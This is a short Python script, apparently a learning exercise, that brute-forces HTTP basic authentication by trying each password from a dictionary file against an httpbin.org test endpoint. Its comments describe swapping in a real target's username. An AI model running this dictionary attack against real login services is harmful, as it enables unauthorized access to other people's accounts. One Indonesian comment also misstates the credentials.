import requests
import sys

url = "http://httpbin.org/basic-auth/user123/Lasagna" # Untuk kasus ini, usernamenya adalah "user" dan passwordnya "pass" # In this case, the username and password is "user123" and "Lasagna" respectively

def brute(username, password):
    r = requests.get(url, auth=(username, password)) # Inputting the target url and authentication (in most cases: username and password)

    if r.status_code == 200: # Status code check, when code 200 is found, correct password would be printed and program will be terminated
        print("Password found: ", password)
        sys.exit() # Program termination
    else:
        print(f"Password: {password} is wrong") # Keeps scanning when status code is not 200

def main(): # Untuk bruteforce password, berlu buat iterasi untuk baca database # Password bruteforce, can use any dictionary (replace "dictionary.txt")
    with open("dictionary.txt", "rb") as file:
        words = [w.strip() for w in file.readlines()] # Remove unnecessary spaces (example: " banana ")

        for payload in words:
            brute("user123", payload) # "user123" can be changed to target's username, and "payload" is the list of passwords we're going to try

if __name__ == '__main__':
    main()